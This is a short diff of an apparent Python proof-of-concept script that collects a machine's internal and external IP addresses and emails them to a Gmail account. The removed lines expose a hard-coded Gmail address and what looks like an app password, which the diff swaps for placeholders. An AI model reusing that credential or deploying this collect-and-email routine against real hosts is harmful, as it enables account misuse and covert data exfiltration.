@@ -8,6 +8,7 @@ import time
 time.sleep(random.randint(1, 5))
 
 ip_exemplo = "192.168.0.1"
+ip_ext_exemplo = "192.168.0.1"
 
 def obter_ip_interno():
     hostname = socket.gethostname()
@@ -24,9 +25,9 @@ def obter_ip_externo():
         return "Erro ao conectar ao serviço de IP"
 def enviar_email(ip_info):
     """Envia as informações de IP por email"""
-    remetente = "ghostprotocol897@gmail.com"  
-    senha = "uizg srle tsoj cxdg"
-    destinatario = "ghostprotocol897@gmail.com"
+    remetente = "email remetente"  
+    senha = "senha de apps"
+    destinatario = "email destinatario"
     
     assunto = "Relatório de IP - PoC Segurança de Dados"
     corpo = f"""Informações de IP coletadas:
